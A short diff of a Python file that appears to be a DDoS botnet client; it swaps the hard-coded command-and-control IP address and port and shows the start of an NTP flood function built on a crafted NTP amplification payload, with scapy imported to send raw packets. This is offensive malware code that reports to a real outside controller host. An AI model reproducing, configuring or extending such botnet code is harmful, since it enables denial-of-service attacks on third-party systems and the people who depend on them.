@@ -11,8 +11,8 @@ import ctypes
 from icmplib import ping as pig
 from scapy.all import IP, UDP, Raw, send
 
-C2_ADDRESS = "147.185.221.27"
-C2_PORT = 4887
+C2_ADDRESS = "147.185.221.24"
+C2_PORT = 21142
 
 ntp_payload = "\x17\x00\x03\x2a" + "\x00" * 4
 def NTP(target, port, timer):
